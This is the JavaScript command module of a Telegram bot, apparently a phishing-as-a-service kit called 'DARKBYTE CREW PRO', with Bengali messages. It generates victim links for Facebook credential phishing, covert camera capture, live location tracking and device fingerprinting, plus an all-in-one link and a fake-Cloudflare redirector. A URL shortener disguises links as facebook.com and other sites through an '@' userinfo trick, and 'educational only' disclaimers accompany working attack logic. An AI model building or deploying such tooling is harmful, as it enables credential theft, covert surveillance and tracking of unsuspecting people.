const database = require('../../utils/database');
const helpers = require('../../utils/helpers');
const logger = require('../../utils/logger');
const constants = require('../../utils/constants');
const authMiddleware = require('../../middleware/authMiddleware');
const linkController = require('../../controllers/linkController');

class UserCommands {
    
    async start(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const userName = msg.from.first_name || 'User';
        const username = msg.from.username || 'No username';

        try {
            // Check if user exists
            const user = await database.query(
                'SELECT * FROM users WHERE user_id = ?',
                [userId]
            );

            if (user.length === 0) {
                // New user
                await database.query(
                    `INSERT INTO users (user_id, username, first_name, last_name, joined_at) 
                     VALUES (?, ?, ?, ?, NOW())`,
                    [userId, username, msg.from.first_name, msg.from.last_name || '']
                );

                // Send welcome message
                await bot.sendMessage(chatId, 
                    `✨ 𝐃𝐀𝐑𝐊𝐁𝐘𝐓𝐄 𝐂𝐑𝐄𝐖 𝐏𝐑𝐎 ✨\n\n` +
                    `আসসালামু আলাইকুম ${userName}! 👋\n\n` +
                    `🤖 আমি একটি অ্যাডভান্সড সিকিউরিটি টেস্টিং বট\n` +
                    `🛡️ পেনিট্রেশন টেস্টিং ও এথিক্যাল হ্যাকিং টুলস\n\n` +
                    `📌 আপনার আইডি: ${userId}\n` +
                    `📌 আপনার স্ট্যাটাস: ⏳ পেন্ডিং\n\n` +
                    `✅ অনুমতি পেতে অ্যাডমিনের সাথে যোগাযোগ করুন:\n` +
                    `👤 @${process.env.ADMIN_USERNAME}\n\n` +
                    `⚠️ নোট: এই বট শুধু শিক্ষামূলক ও টেস্টিং উদ্দেশ্যে তৈরি`,
                    { parse_mode: 'HTML' }
                );

                // Notify admins
                await this.notifyAdminsNewUser(bot, msg, userName, userId, username);

            } else {
                // Returning user
                const userData = user[0];
                
                if (userData.is_banned) {
                    await bot.sendMessage(chatId, constants.MESSAGES.BANNED);
                } else if (!userData.is_approved) {
                    await bot.sendMessage(chatId,
                        `⏳ আপনার অনুমতি এখনও পেন্ডিং আছে\n\n` +
                        `অনুগ্রহ করে @${process.env.ADMIN_USERNAME} এর সাথে যোগাযোগ করুন।`
                    );
                } else {
                    await bot.sendMessage(chatId,
                        `✅ স্বাগতম ${userName}!\n\n` +
                        `আপনার সব টুল একটিভ আছে।\n` +
                        `কমান্ড দেখতে /help টাইপ করুন।`
                    );
                }
            }

            // Update last active
            await database.query(
                'UPDATE users SET last_active = NOW() WHERE user_id = ?',
                [userId]
            );

        } catch (error) {
            console.error('Start command error:', error);
            await bot.sendMessage(chatId, 'একটি ত্রুটি হয়েছে। পরে আবার চেষ্টা করুন।');
        }
    }

    async notifyAdminsNewUser(bot, msg, userName, userId, username) {
        const adminIds = process.env.ADMIN_IDS.split(',');
        
        const message = 
            `🆕 𝐍𝐄𝐖 𝐔𝐒𝐄𝐑 𝐉𝐎𝐈𝐍𝐄𝐃 🆕\n\n` +
            `👤 নাম: ${userName}\n` +
            `🆔 আইডি: ${userId}\n` +
            `📛 ইউজারনেম: @${username}\n` +
            `📅 জয়েন: ${new Date().toLocaleString('bn-BD')}\n\n` +
            `🔍 প্রোফাইল: /userinfo ${userId}\n` +
            `⚡ কুইক অ্যাকশন: /approve ${userId} | /reject ${userId}`;

        for (const adminId of adminIds) {
            try {
                await bot.sendMessage(adminId.trim(), message);
            } catch (e) {
                console.error(`Failed to notify admin ${adminId}:`, e);
            }
        }
    }

    async fbPhishing(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        // Check permission
        if (!await authMiddleware.checkPermission(userId, 'fbphishing')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        try {
            // Generate unique ID
            const uniqueId = `fb_${Date.now()}_${helpers.generateRandomString(8)}`;
            
            // Create link in database
            await linkController.createLink({
                linkId: uniqueId,
                userId: userId,
                type: 'fb',
                expiresIn: 7 // days
            });

            // Send response
            await bot.sendMessage(chatId,
                `✅ 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐏𝐇𝐈𝐒𝐇𝐈𝐍𝐆 𝐋𝐈𝐍𝐊 𝐂𝐑𝐄𝐀𝐓𝐄𝐃\n\n` +
                `🔗 আপনার লিঙ্ক:\n` +
                `https://${process.env.BASE_URL}/fb/${uniqueId}\n\n` +
                `📊 লিঙ্ক আইডি: ${uniqueId}\n` +
                `⏰ এক্সপায়ার: ৭ দিন\n\n` +
                `📈 ট্র্যাকিং ফিচার:\n` +
                `• ভিজিটর কাউন্ট\n` +
                `• রিয়েল-টাইম ডাটা\n` +
                `• আইপি লোকেশন\n` +
                `• ডিভাইস ইনফো\n\n` +
                `🔔 নতুন ভিজিট/ডাটা পেলে ইনস্ট্যান্ট নোটিফিকেশন পাবেন।`
            );

            // Log activity
            await logger.logActivity(userId, 'create_fb_link', { linkId: uniqueId });

        } catch (error) {
            console.error('FB Phishing error:', error);
            await bot.sendMessage(chatId, 'লিঙ্ক তৈরি করতে সমস্যা হয়েছে।');
        }
    }

    async camera(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!await authMiddleware.checkPermission(userId, 'camera')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        try {
            const uniqueId = `cam_${Date.now()}_${helpers.generateRandomString(8)}`;
            
            await linkController.createLink({
                linkId: uniqueId,
                userId: userId,
                type: 'camera',
                expiresIn: 7
            });

            await bot.sendMessage(chatId,
                `✅ 𝐂𝐀𝐌𝐄𝐑𝐀 𝐂𝐀𝐏𝐓𝐔𝐑𝐄 𝐋𝐈𝐍𝐊\n\n` +
                `🔗 আপনার লিঙ্ক:\n` +
                `https://${process.env.BASE_URL}/camera/${uniqueId}\n\n` +
                `📸 ক্যাপচার মোড: প্রতি ২ সেকেন্ডে ফটো\n` +
                `🖼️ ইমেজ কোয়ালিটি: এইচডি\n` +
                `💾 স্টোরেজ: ৭ দিন\n\n` +
                `⚡ ফিচার:\n` +
                `• ফটো পেলেই ইনস্ট্যান্ট ফরওয়ার্ড\n` +
                `• ফেস ডিটেকশন এলার্ট\n` +
                `• মাল্টিপল এঙ্গেল ক্যাপচার`
            );

            await logger.logActivity(userId, 'create_camera_link', { linkId: uniqueId });

        } catch (error) {
            console.error('Camera command error:', error);
            await bot.sendMessage(chatId, 'লিঙ্ক তৈরি করতে সমস্যা হয়েছে।');
        }
    }

    async location(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!await authMiddleware.checkPermission(userId, 'location')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        try {
            const uniqueId = `loc_${Date.now()}_${helpers.generateRandomString(8)}`;
            
            await linkController.createLink({
                linkId: uniqueId,
                userId: userId,
                type: 'location',
                expiresIn: 7
            });

            await bot.sendMessage(chatId,
                `✅ 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐓𝐑𝐀𝐂𝐊𝐄𝐑 𝐋𝐈𝐍𝐊\n\n` +
                `🔗 আপনার লিঙ্ক:\n` +
                `https://${process.env.BASE_URL}/location/${uniqueId}\n\n` +
                `📍 ফিচার:\n` +
                `• রিয়েল-টাইম লোকেশন\n` +
                `• গুগল ম্যাপ ইন্টিগ্রেশন\n` +
                `• এসিুরেসি লেভেল ডিটেকশন\n` +
                `• মুভমেন্ট ট্র্যাকিং\n\n` +
                `⏰ এক্সপায়ার: ৭ দিন`
            );

            await logger.logActivity(userId, 'create_location_link', { linkId: uniqueId });

        } catch (error) {
            console.error('Location command error:', error);
            await bot.sendMessage(chatId, 'লিঙ্ক তৈরি করতে সমস্যা হয়েছে।');
        }
    }

    async info(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!await authMiddleware.checkPermission(userId, 'info')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        try {
            const uniqueId = `info_${Date.now()}_${helpers.generateRandomString(8)}`;
            
            await linkController.createLink({
                linkId: uniqueId,
                userId: userId,
                type: 'info',
                expiresIn: 7
            });

            await bot.sendMessage(chatId,
                `✅ 𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎 𝐂𝐎𝐋𝐋𝐄𝐂𝐓𝐎𝐑\n\n` +
                `🔗 আপনার লিঙ্ক:\n` +
                `https://${process.env.BASE_URL}/info/${uniqueId}\n\n` +
                `📊 যা কালেক্ট করবে:\n` +
                `• আইপি এড্রেস ও লোকেশন\n` +
                `• ডিভাইস নাম ও মডেল\n` +
                `• অপারেটিং সিস্টেম\n` +
                `• ব্রাউজার ডিটেইলস\n` +
                `• নেটওয়ার্ক টাইপ\n` +
                `• ব্যাটারি স্ট্যাটাস\n` +
                `• স্ক্রিন রেজুলুশন\n\n` +
                `⏰ এক্সপায়ার: ৭ দিন`
            );

            await logger.logActivity(userId, 'create_info_link', { linkId: uniqueId });

        } catch (error) {
            console.error('Info command error:', error);
            await bot.sendMessage(chatId, 'লিঙ্ক তৈরি করতে সমস্যা হয়েছে।');
        }
    }

    async allInOne(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!await authMiddleware.checkPermission(userId, 'all')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        try {
            const uniqueId = `all_${Date.now()}_${helpers.generateRandomString(8)}`;
            
            await linkController.createLink({
                linkId: uniqueId,
                userId: userId,
                type: 'all',
                expiresIn: 7
            });

            await bot.sendMessage(chatId,
                `⚡ 𝐀𝐋𝐋-𝐈𝐍-𝐎𝐍𝐄 𝐋𝐈𝐍𝐊 𝐂𝐑𝐄𝐀𝐓𝐄𝐃\n\n` +
                `🔗 আপনার মাস্টার লিঙ্ক:\n` +
                `https://${process.env.BASE_URL}/all/${uniqueId}\n\n` +
                `📦 এই লিঙ্ক যা যা কালেক্ট করবে:\n` +
                `✅ ফেসবুক ক্রেডেনশিয়াল\n` +
                `✅ ক্যামেরা ফটো\n` +
                `✅ লোকেশন কোঅর্ডিনেটস\n` +
                `✅ ডিভাইস ইনফো\n` +
                `✅ নেটওয়ার্ক ইনফো\n` +
                `✅ ব্যাটারি স্ট্যাটাস\n\n` +
                `📊 সব ডাটা আলাদা আলাদা নোটিফিকেশন আসবে\n` +
                `⏰ এক্সপায়ার: ৭ দিন`
            );

            await logger.logActivity(userId, 'create_all_link', { linkId: uniqueId });

        } catch (error) {
            console.error('All command error:', error);
            await bot.sendMessage(chatId, 'লিঙ্ক তৈরি করতে সমস্যা হয়েছে।');
        }
    }

    async custom(bot, msg, match) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetUrl = match[1];

        if (!await authMiddleware.checkPermission(userId, 'custom')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        if (!helpers.isValidUrl(targetUrl)) {
            return bot.sendMessage(chatId, '❌ দয়া করে একটি বৈধ URL দিন।');
        }

        try {
            const uniqueId = `custom_${Date.now()}_${helpers.generateRandomString(8)}`;
            const encodedUrl = encodeURIComponent(targetUrl);
            
            await linkController.createLink({
                linkId: uniqueId,
                userId: userId,
                type: 'custom',
                targetUrl: targetUrl,
                expiresIn: 7
            });

            await bot.sendMessage(chatId,
                `🎯 𝐂𝐔𝐒𝐓𝐎𝐌 𝐑𝐄𝐃𝐈𝐑𝐄𝐂𝐓 𝐋𝐈𝐍𝐊\n\n` +
                `🔗 জেনারেটেড লিঙ্ক:\n` +
                `https://${process.env.BASE_URL}/custom/${uniqueId}?url=${encodedUrl}\n\n` +
                `⚡ ফ্লো:\n` +
                `1️⃣ ইউজার লিঙ্কে ক্লিক করবে\n` +
                `2️⃣ ক্লাউডফ্লেয়ার পেজ দেখবে\n` +
                `3️⃣ পারমিশন নিবে\n` +
                `4️⃣ ডাটা কালেক্ট করবে\n` +
                `5️⃣ টার্গেট সাইটে রিডাইরেক্ট করবে\n\n` +
                `📊 কালেক্টেড ডাটা:\n` +
                `• আইপি ও লোকেশন\n` +
                `• ডিভাইস ইনফো\n` +
                `• ক্যামেরা ফটো (পারমিশন দিলে)\n` +
                `• লোকেশন (পারমিশন দিলে)`
            );

            await logger.logActivity(userId, 'create_custom_link', { linkId: uniqueId, targetUrl });

        } catch (error) {
            console.error('Custom command error:', error);
            await bot.sendMessage(chatId, 'লিঙ্ক তৈরি করতে সমস্যা হয়েছে।');
        }
    }

    async shorten(bot, msg, match) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const args = match[1].split(' ');

        if (!await authMiddleware.checkPermission(userId, 'shorten')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        if (args.length < 2) {
            return bot.sendMessage(chatId, this.getShortenHelp());
        }

        const siteCode = args[0].toLowerCase();
        const url = args[1];

        if (!helpers.isValidUrl(url)) {
            return bot.sendMessage(chatId, '❌ দয়া করে একটি বৈধ URL দিন।');
        }

        const siteMap = {
            'fb': 'facebook.com',
            'yt': 'youtube.com',
            'ig': 'instagram.com',
            'tw': 'twitter.com',
            'wa': 'whatsapp.com',
            'tg': 'telegram.org',
            'ck': 'tiktok.com',
            'pt': 'pinterest.com',
            'rd': 'reddit.com',
            'li': 'linkedin.com'
        };

        if (!siteMap[siteCode]) {
            return bot.sendMessage(chatId, '❌ ভুল সাইট কোড। সঠিক কোড দেখতে /shorten টাইপ করুন।');
        }

        try {
            // Call is.gd API
            const response = await axios.get(process.env.ISGD_API, {
                params: {
                    format: 'json',
                    url: url
                }
            });

            if (response.data.errorcode) {
                throw new Error(response.data.errormessage);
            }

            const shortUrl = response.data.shorturl;
            const customUrl = `https://${siteMap[siteCode]}-1@is.gd/${shortUrl.split('/').pop()}`;

            // Save to database
            const shortCode = helpers.generateRandomString(6);
            await database.query(
                `INSERT INTO shortened_links (short_code, original_url, user_id, site_code, isgd_url) 
                 VALUES (?, ?, ?, ?, ?)`,
                [shortCode, url, userId, siteCode, shortUrl]
            );

            await bot.sendMessage(chatId,
                `🔄 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐃 𝐔𝐑𝐋 𝐂𝐑𝐄𝐀𝐓𝐄𝐃\n\n` +
                `🔗 আপনার শর্ট লিঙ্ক:\n` +
                `${customUrl}\n\n` +
                `📊 ট্র্যাকিং:\n` +
                `• টোটাল ক্লিক: ০\n` +
                `• ইউনিক ভিজিটর: ০\n` +
                `• ক্রিয়েটেড: ${new Date().toLocaleString('bn-BD')}\n\n` +
                `📋 লিঙ্ক আইডি: ${shortCode}`
            );

            await logger.logActivity(userId, 'create_short_link', { shortCode, siteCode });

        } catch (error) {
            console.error('Shorten error:', error);
            await bot.sendMessage(chatId, 'লিঙ্ক শর্ট করতে সমস্যা হয়েছে।');
        }
    }

    getShortenHelp() {
        return (
            `🔄 𝐒𝐇𝐎𝐑𝐓𝐄𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐅𝐎𝐑𝐌𝐀𝐓\n\n` +
            `📌 ফরম্যাট: /shorten [site_code] [url]\n\n` +
            `🎯 সাইট কোডসমূহ:\n` +
            `• fb → facebook.com\n` +
            `• yt → youtube.com\n` +
            `• ig → instagram.com\n` +
            `• tw → twitter.com\n` +
            `• wa → whatsapp.com\n` +
            `• tg → telegram.org\n` +
            `• ck → tiktok.com\n` +
            `• pt → pinterest.com\n` +
            `• rd → reddit.com\n` +
            `• li → linkedin.com\n\n` +
            `📝 উদাহরণ:\n` +
            `/shorten fb https://example.com\n` +
            `→ https://facebook.com-1@is.gd/abc123`
        );
    }

    async myLinks(bot, msg, match) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const option = match[1] || 'recent';

        if (!await authMiddleware.checkPermission(userId, 'mylinks')) {
            return bot.sendMessage(chatId, constants.MESSAGES.ACCESS_DENIED);
        }

        try {
            // Get user stats
            const userStats = await database.query(
                `SELECT total_links, total_visits, total_data FROM users WHERE user_id = ?`,
                [userId]
            );

            // Get recent links
            const links = await database.query(
                `SELECT link_id, link_type, total_visits, total_data, created_at 
                 FROM links 
                 WHERE user_id = ? 
                 ORDER BY created_at DESC 
                 LIMIT 5`,
                [userId]
            );

            let message = `📊 𝐘𝐎𝐔𝐑 𝐋𝐈𝐍𝐊 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃\n\n`;
            message += `👤 ইউজার: ${msg.from.first_name}\n`;
            message += `🆔 আইডি: ${userId}\n`;
            message += `📊 স্ট্যাটিস্টিক্স:\n`;
            message += `• টোটাল লিঙ্ক: ${userStats[0]?.total_links || 0}\n`;
            message += `• টোটাল ভিজিট: ${userStats[0]?.total_visits || 0}\n`;
            message += `• টোটাল ডাটা: ${userStats[0]?.total_data || 0}\n\n`;

            message += `🔗 ইওর লিঙ্কস (রিসেন্ট ৫):\n\n`;

            links.forEach((link, index) => {
                const typeNames = {
                    'fb': 'ফেসবুক ফিশিং',
                    'camera': 'ক্যামেরা টুল',
                    'location': 'লোকেশন ট্র্যাকার',
                    'info': 'ইনফো কালেক্টর',
                    'all': 'অল-ইন-ওয়ান',
                    'custom': 'কাস্টম রিডাইরেক্ট'
                };

                message += `${index + 1}. ${typeNames[link.link_type] || link.link_type}\n`;
                message += `🔗 আইডি: ${link.link_id}\n`;
                message += `👁️ ভিজিট: ${link.total_visits} | 📦 ডাটা: ${link.total_data}\n`;
                message += `📅 ক্রিয়েটেড: ${helpers.timeAgo(link.created_at)}\n`;
                message += `⚡ স্ট্যাটাস: ${link.expires_at ? 'একটিভ' : 'এক্সপায়ার্ড'}\n\n`;
            });

            if (links.length === 0) {
                message += `আপনার কোনো লিঙ্ক নেই।\n`;
                message += `/fbphishing দিয়ে প্রথম লিঙ্ক তৈরি করুন।\n`;
            } else {
                message += `🔄 আরও দেখতে: /mylinks all\n`;
                message += `📥 এক্সপোর্ট: /export mydata\n`;
            }

            await bot.sendMessage(chatId, message);

        } catch (error) {
            console.error('MyLinks error:', error);
            await bot.sendMessage(chatId, 'ড্যাশবোর্ড লোড করতে সমস্যা হয়েছে।');
        }
    }

    async help(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        const user = await database.query(
            'SELECT is_approved FROM users WHERE user_id = ?',
            [userId]
        );

        if (user.length === 0 || !user[0].is_approved) {
            return bot.sendMessage(chatId, 
                `❌ হেল্প দেখতে প্রথমে অনুমতি নিন।\n` +
                `@${process.env.ADMIN_USERNAME} এর সাথে যোগাযোগ করুন।`
            );
        }

        const helpMessage = 
            `📚 𝐃𝐀𝐑𝐊𝐁𝐘𝐓𝐄 𝐁𝐎𝐓 𝐇𝐄𝐋𝐏\n\n` +
            `🎯 ইউজার কমান্ডসমূহ:\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `/fbphishing - ফেসবুক ফিশিং লিঙ্ক তৈরি\n` +
            `/camera - ক্যামেরা ক্যাপচার লিঙ্ক\n` +
            `/location - লোকেশন ট্র্যাকার লিঙ্ক\n` +
            `/info - ডিভাইস ইনফো কালেক্টর\n` +
            `/all - অল-ইন-ওয়ান টুল\n` +
            `/custom [url] - কাস্টম রিডাইরেক্টর\n` +
            `/shorten [code] [url] - ইউআরএল শর্টনার\n` +
            `/mylinks - আপনার লিঙ্ক ড্যাশবোর্ড\n` +
            `/help - এই মেসেজ\n\n` +
            `⚠️ সতর্কতা:\n` +
            `• শুধু শিক্ষামূলক উদ্দেশ্যে ব্যবহার করুন\n` +
            `• অপব্যবহার করলে ব্যান করা হবে\n` +
            `• প্রশ্ন থাকলে @${process.env.ADMIN_USERNAME}`;

        await bot.sendMessage(chatId, helpMessage);
    }
}

module.exports = new UserCommands();